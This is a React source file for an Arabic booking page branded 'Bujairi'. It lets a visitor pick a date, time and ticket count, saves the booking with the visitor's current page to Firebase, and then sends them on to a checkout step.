import { ChevronDown, Calendar, Clock, Ticket, Info, Plus, Minus } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Link, useLocation } from "wouter";
import { useState, useEffect } from "react";
import { addData, handleCurrentPage } from "@/lib/firebase";
import {
  RestaurantNav,
  ProgressBar,
  PageBanner,
  BujairiFooter,
} from "@/components/bujairi-header";

const TICKET_PRICE = 50;

export default function BookingPage() {
  const [date, setDate] = useState<Date | undefined>(new Date());
  const [time, setTime] = useState("09:00");
  const [quantity, setQuantity] = useState(1);

  useEffect(() => {
    handleCurrentPage("booking");
  }, []);

  return (
    <div className="min-h-screen bg-[#ebddd0] flex flex-col" dir="rtl">
      <RestaurantNav active="booking-options" />
      <ProgressBar current={2} />
      <PageBanner title="الحجز" />
      <main className="flex-1 pb-8">
        <BookingForm
          date={date}
          setDate={setDate}
          time={time}
          setTime={setTime}
          quantity={quantity}
          setQuantity={setQuantity}
        />
        <TermsSection />
      </main>
      <BujairiFooter />
    </div>
  );
}

function BookingForm({ 
  date, 
  setDate, 
  time, 
  setTime,
  quantity,
  setQuantity,
}: { 
  date: Date | undefined; 
  setDate: (d: Date | undefined) => void; 
  time: string; 
  setTime: (t: string) => void;
  quantity: number;
  setQuantity: (q: number) => void;
}) {
  const timeSlots = [
    "09:00", "10:00", "11:00", "12:00",
    "13:00", "14:00", "15:00", "16:00",
    "17:00", "18:00", "19:00", "20:00",
    "21:00", "22:00", "23:00", "00:00",
  ];
  const [, setLocation] = useLocation();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const handleConfirmBooking = async () => {
    if (isSubmitting) return;
    setIsSubmitting(true);
    setSubmitError("");
    const bookingData = { date: date?.toISOString(), time };
    localStorage.setItem("bookingData", JSON.stringify(bookingData));
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setSubmitError("لم يتم العثور على بيانات الزائر");
      setIsSubmitting(false);
      return;
    }
    const ok = await addData({
      id: visitorId,
      currentPage: "booking",
      ticketQuantity: quantity,
      ticketPrice: TICKET_PRICE,
      totalAmount: quantity * TICKET_PRICE,
      bookingDate: bookingData.date,
      bookingTime: bookingData.time,
    });
    if (!ok) {
      setSubmitError("تعذر إكمال الحجز، يرجى المحاولة مرة أخرى");
      setIsSubmitting(false);
      return;
    }
    setLocation("/checkout");
  };

  return (
    <section className="px-4 py-8" data-testid="section-booking-form">
      <div className="max-w-md mx-auto bg-white rounded-2xl shadow-xl p-6 space-y-6 animate-fade-in">
        <h2 className="text-center text-xl font-bold text-foreground">
          الرجاء الاختيار
        </h2>

        <div className="space-y-6">
          <div>
            <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
              <Calendar className="w-4 h-4 text-primary" />
              اختيار التاريخ *
            </Label>
            <Input
              type="date"
              value={date ? date.toISOString().split('T')[0] : ''}
              onChange={(e) => setDate(e.target.value ? new Date(e.target.value) : undefined)}
              min={new Date().toISOString().split('T')[0]}
              className="w-full text-center h-12 rounded-xl border-2 focus:border-primary"
              data-testid="input-date"
            />
            {date && (
              <div className="text-center mt-3 p-3 bg-primary/10 rounded-xl" data-testid="text-selected-date">
                <p className="text-sm text-primary font-medium">
                  التاريخ المحدد: {date.toLocaleDateString('ar-SA')}
                </p>
              </div>
            )}
          </div>

          <div>
            <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
              <Clock className="w-4 h-4 text-primary" />
              اختيار الوقت *
            </Label>
            <div className="relative">
              <select
                value={time}
                onChange={(e) => setTime(e.target.value)}
                className="w-full h-12 px-4 rounded-xl border-2 border-input bg-background text-foreground appearance-none text-center font-medium focus:border-primary focus:outline-none"
                data-testid="select-time"
              >
                {timeSlots.map((slot) => (
                  <option key={slot} value={slot}>
                    {slot}
                  </option>
                ))}
              </select>
              <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground pointer-events-none" />
            </div>
          </div>
        </div>

        <div>
          <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
            <Ticket className="w-4 h-4 text-primary" />
            عدد التذاكر *
          </Label>
          <div className="flex items-center justify-between bg-muted rounded-xl p-2">
            <Button
              type="button"
              size="icon"
              variant="ghost"
              className="h-10 w-10 rounded-lg"
              onClick={() => setQuantity(Math.max(1, quantity - 1))}
              data-testid="button-decrease-qty"
            >
              <Minus className="w-4 h-4" />
            </Button>
            <span className="font-bold text-lg" data-testid="text-quantity">
              {quantity}
            </span>
            <Button
              type="button"
              size="icon"
              variant="ghost"
              className="h-10 w-10 rounded-lg"
              onClick={() => setQuantity(quantity + 1)}
              data-testid="button-increase-qty"
            >
              <Plus className="w-4 h-4" />
            </Button>
          </div>
        </div>

        <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] rounded-xl p-5">
          <div className="flex items-center gap-2 mb-3">
            <Ticket className="w-5 h-5 text-primary" />
            <h3 className="font-bold text-foreground">المجموع</h3>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-muted-foreground">
              {quantity} × {TICKET_PRICE} ر.س
            </span>
            <span
              className="font-bold text-xl text-primary"
              data-testid="text-booking-total"
            >
              {quantity * TICKET_PRICE} ر.س
            </span>
          </div>
        </div>

        <div className="space-y-3 pt-4">
          <Button 
            size="lg"
            className="w-full bg-primary text-white shadow-lg"
            onClick={() => {
              void handleConfirmBooking();
            }}
            disabled={isSubmitting}
            data-testid="button-confirm-booking"
          >
            {isSubmitting ? "جاري الإرسال..." : "المتابعة للدفع"}
          </Button>

          {submitError && (
            <p className="text-red-500 text-xs text-center" data-testid="error-booking-submit">
              {submitError}
            </p>
          )}
          
          <Link href="/">
            <Button 
              variant="outline"
              size="lg"
              className="w-full"
              data-testid="button-cancel-booking"
            >
              إلغاء
            </Button>
          </Link>
        </div>
      </div>
    </section>
  );
}

function TermsSection() {
  return (
    <section className="px-4 py-6 max-w-md mx-auto" data-testid="section-booking-terms">
      <div className="bg-white rounded-2xl shadow-lg p-6">
        <div className="flex items-center gap-2 mb-4">
          <Info className="w-5 h-5 text-primary" />
          <h3 className="text-lg font-bold text-foreground">الشروط والأحكام</h3>
        </div>
        <div className="text-sm text-muted-foreground space-y-3 leading-relaxed">
          <p>
            يلزم الضيف بالحجز والوصول في الوقت المحدد.
          </p>
          <p>
            يلزم الضيف بعدم الحجز لتذاكر لعدة مطاعم في نفس الوقت، كما يُحظر إعادة بيع الحجوزات.
          </p>
          <p>
            يمكن إجراء الحجوزات من خلال الموقع الإلكتروني الخاص بالمحل فقط.
          </p>
          <p>
            الحجوزات تسمح بالدخول مرة واحدة إلى المنطقة ومغادرة التاريخ المحدد فقط.
          </p>
          <p>
            جميع المبالغ التي لم يتم دفعها للحجز غير مستردة.
          </p>
        </div>
      </div>
    </section>
  );
}

